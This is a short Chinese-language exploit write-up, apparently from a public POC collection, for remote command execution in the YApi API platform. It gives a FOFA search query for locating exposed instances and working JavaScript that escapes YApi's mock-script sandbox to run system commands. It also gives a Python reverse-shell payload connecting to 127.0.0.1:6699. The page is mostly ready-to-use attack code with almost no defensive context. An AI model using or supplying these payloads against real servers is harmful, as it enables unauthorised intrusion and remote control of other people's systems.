# Yapi存在远程命令执行漏洞

# 一、漏洞简介
Yapi存在远程命令执行漏洞

# 二、影响版本
+ Yapi

# 三、资产测绘
+ fofa：`app="YApi"`
+ 特征


# 四、漏洞复现
注册账号登录


新建项目


添加接口


```java
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("whoami && ps -ef").toString()
```


反弹shell

```java
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
Poc = process.mainModule.require("child_process").spawnSync(
  'python', ['-c', 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",6699));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);']
)
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/zwurnkdpoozs08fc>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
